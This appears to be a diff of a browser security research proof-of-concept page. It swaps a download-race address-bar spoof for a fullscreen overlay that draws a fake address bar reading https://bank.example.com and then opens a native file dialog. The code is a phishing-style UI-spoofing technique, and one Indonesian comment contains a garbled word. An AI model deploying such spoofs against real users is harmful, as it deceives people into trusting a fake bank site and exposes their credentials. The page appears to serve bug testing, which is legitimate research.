@@ -1,34 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Research PoC - Download Nav Race</title>
+<title>Research PoC - Fullscreen Overlay Spoof</title>
 </head>
 <body>
-<h3>PoC: Address bar spoof via download race</h3>
-<p>Expected: URL bar shows evil.html after navigation.<br>
-Bug (if present): URL bar still shows the original download URL.</p>
+<h3>PoC: Fullscreen + native dialog overlay</h3>
 <script>
-// 1. Trigger a download that stays active (slow drip keeps it alive)
-function slowDownload() {
-  const blob = new Blob([new ArrayBuffer(1024)], {type: "application/octet-stream"});
-  const url = URL.createObjectURL(blob);
-  const a = document.createElement("a");
-  a.href = url;
-  a.download = "report.pdf";
-  a.click();
-}
+async function run() {
+  // 1. Masuk fullscreen, gambar address bar palsu di overlay
+  await document.documentElement.requestFullscreen();
+  const overlay = document.createElement("div");
+  overlay.style.cssText = "position:fixed;top:0;left:0;right:0;height:80px;" +
+    "background:#1a73e8;color:#fff;display:flex;align-items:center;padding:0 16px;" +
+    "font-family:sans-serif;z-index:9999";
+  overlay.innerHTML = "<span style='background:#fff;color:#333;padding:6px 24px;" +
+    "border-radius:20px'>https://bank.example.com</span>";
+  document.body.appendChild(overlay);
 
-// 2. Immediately navigate to attacker-controlled "phishing" content
-//    while the download is still in progress
-function run() {
-  slowDownload();
+  // 2. Trigger dialog native yang mungkin digambar di atas overlay,
+  //    membuka jendela ke desktop di belakangnya (cjual address bar asli)
   setTimeout(() => {
-    location.replace(location.href.split("#")[0] + "#phishing-content");
-    // For a real test, replace() to a different origin page you control:
-    // location.replace("https://YOUR-TEST-ORIGIN.example/evil.html");
-  }, 50);
+    const input = document.createElement("input");
+    input.type = "file";
+    input.onchange = () => document.exitFullscreen();
+    input.click();
+  }, 1500);
 }
 </script>
-<button onclick="run()">Start PoC</button>
+<button onclick="run()">Start fullscreen PoC</button>
 </body>
 </html>
